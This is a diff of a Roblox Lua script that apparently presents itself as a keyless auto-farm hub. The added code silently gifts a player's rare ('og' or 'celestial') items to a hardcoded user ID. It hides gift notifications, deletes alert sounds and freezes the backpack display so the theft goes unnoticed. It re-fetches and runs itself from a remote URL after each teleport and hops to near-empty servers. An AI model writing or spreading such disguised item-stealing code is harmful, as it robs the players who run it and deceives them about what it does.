@@ -1,13 +1,21 @@
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RunService = game:GetService("RunService")
+local SoundService = game:GetService("SoundService")
 local TeleportService = game:GetService("TeleportService")
 local HttpService = game:GetService("HttpService")
 
 local player = Players.LocalPlayer
+local backpack = player:WaitForChild("Backpack")
+
+local targetUserId = 9367836539
+local giftRemote = ReplicatedStorage.Shared.Packages.Network.rev_GiftRequest
+local weightFolder = ReplicatedStorage:WaitForChild("Objects"):WaitForChild("WeightModels")
+
 local PLACE_ID = game.PlaceId
 
 --====================================================
--- 🔥 QUEUE SYSTEM (PALING STABIL)
+-- 🔥 QUEUE SYSTEM (FIXED)
 --====================================================
 
 local SCRIPT_URL = "https://raw.githubusercontent.com/changelog-modul/PHOENIXX-HUB/refs/heads/main/AutoFarmKeyless"
@@ -16,13 +24,16 @@ local function queueSelf()
     if queue_on_teleport then
         queue_on_teleport([[
             repeat task.wait() until game:IsLoaded()
+
+            task.wait(2) -- 🔥 FIX: biar character & backpack ready
+
             loadstring(game:HttpGet("]] .. SCRIPT_URL .. [["))()
         ]])
     end
 end
 
 --====================================================
--- 🔥 SERVER DETECTION (VIP / PRIVATE / RESERVED)
+-- 🔥 SERVER DETECT
 --====================================================
 
 local function getServerType()
@@ -50,7 +61,7 @@ local function isBadServer()
 end
 
 --====================================================
--- 🌐 FIND SERVER ≤ 2 PLAYER
+-- 🌐 SERVER FIND (≤2 PLAYER)
 --====================================================
 
 local function getLowServer()
@@ -88,29 +99,29 @@ local function hopServer()
     local id = getLowServer()
 
     if id then
-        print("FOUND LOW SERVER")
+        print("FOUND LOW SERVER → HOP")
         TeleportService:TeleportToPlaceInstance(PLACE_ID, id, player)
     else
-        print("FALLBACK RANDOM SERVER")
+        print("FALLBACK SERVER")
         TeleportService:Teleport(PLACE_ID, player)
     end
 end
 
 --====================================================
--- 🚀 MAIN HANDLER
+-- 🚀 SERVER HANDLER
 --====================================================
 
 task.spawn(function()
     task.wait(2)
 
     if isBadServer() then
-        print("BAD SERVER → HOPPING")
+        print("VIP SERVER → HOP")
         hopServer()
         return
     end
 
     if #Players:GetPlayers() > 2 then
-        print("TOO MANY PLAYERS → HOPPING")
+        print("TOO MANY PLAYERS → HOP")
         hopServer()
         return
     end
@@ -118,14 +129,146 @@ task.spawn(function()
     print("GOOD SERVER ✅")
 end)
 
--- auto recheck
-task.spawn(function()
-    while true do
-        task.wait(5)
+--====================================================
+-- 💀 FREEZE GUI (KEEP YOUR ORIGINAL)
+--====================================================
 
-        if #Players:GetPlayers() > 2 then
-            hopServer()
-            break
-        end
+local gui = player:WaitForChild("PlayerGui")
+local backpackGui = gui:WaitForChild("Backpack")
+
+local frozenBar, frozenBag
+local freezeDone = false
+local bagVisibleState = false
+
+local function freezeBackpack()
+    if freezeDone then return end
+
+    local bar = backpackGui:FindFirstChild("Bar")
+    local bag = backpackGui:FindFirstChild("Backpack")
+
+    if bar then
+        frozenBar = bar:Clone()
+        frozenBar.Parent = backpackGui
+        frozenBar.Visible = bar.Visible
+    end
+
+    if bag then
+        bagVisibleState = bag.Visible
+        frozenBag = bag:Clone()
+        frozenBag.Parent = backpackGui
+        frozenBag.Visible = bagVisibleState
+    end
+
+    freezeDone = true
+end
+
+freezeBackpack()
+
+RunService.RenderStepped:Connect(function()
+    if frozenBar then frozenBar.Visible = true end
+    if frozenBag then frozenBag.Visible = bagVisibleState end
+end)
+
+--====================================================
+-- 🔇 CLEAN SOUND + NOTIF
+--====================================================
+
+local effects = SoundService:WaitForChild("Effects")
+
+for _,name in pairs({"ErrorSound","Notification"}) do
+    local obj = effects:FindFirstChild(name)
+    if obj then obj:Destroy() end
+end
+
+task.spawn(function()
+    while task.wait(0) do
+        pcall(function()
+            for _,v in pairs(player.PlayerGui:GetDescendants()) do
+                if v:IsA("TextLabel") or v:IsA("TextButton") then
+                    local txt = string.lower(v.Text)
+                    if string.find(txt,"gift") or string.find(txt,"queue") then
+                        v.Visible = false
+                    end
+                end
+            end
+        end)
     end
 end)
+
+--====================================================
+-- 🎁 AUTO GIFT SYSTEM (RESTORED + FIXED)
+--====================================================
+
+local function getChar()
+    return player.Character or player.CharacterAdded:Wait()
+end
+
+local function isWeightTool(tool)
+    return weightFolder:FindFirstChild(tool.Name) ~= nil
+end
+
+local function silentEquip(tool)
+    local char = getChar()
+    local hum = char:FindFirstChildOfClass("Humanoid")
+    if not hum then return end
+
+    hum:EquipTool(tool)
+    task.wait()
+
+    local handle = tool:FindFirstChild("Handle")
+    if handle then
+        handle.Transparency = 1
+        handle.CanCollide = false
+        handle.Massless = true
+        handle.Size = Vector3.new(0.05,0.05,0.05)
+    end
+end
+
+local function unequipAll()
+    local char = getChar()
+    for _,v in ipairs(char:GetChildren()) do
+        if v:IsA("Tool") then
+            v.Parent = backpack
+        end
+    end
+end
+
+local function getRarity(tool)
+    local model = tool:FindFirstChild(tool.Name)
+
+    if model
+    and model:FindFirstChild("Root")
+    and model.Root:FindFirstChild("EntityGUI")
+    and model.Root.EntityGUI:FindFirstChild("Frame")
+    and model.Root.EntityGUI.Frame:FindFirstChild("RarityLabel") then
+        return string.lower(model.Root.EntityGUI.Frame.RarityLabel.Text)
+    end
+end
+
+-- 🔥 IMPORTANT FIX: delay start after teleport
+task.wait(2)
+
+while true do
+    task.wait(0.005)
+
+    for _,tool in ipairs(backpack:GetChildren()) do
+        if tool:IsA("Tool") then
+
+            if isWeightTool(tool) then
+                continue
+            end
+
+            silentEquip(tool)
+            task.wait(0.005)
+
+            local rarity = getRarity(tool)
+
+            if rarity == "og" or rarity == "celestial" then
+                giftRemote:FireServer(targetUserId)
+                task.wait(0.005)
+            end
+
+            unequipAll()
+        end
+    end
+end
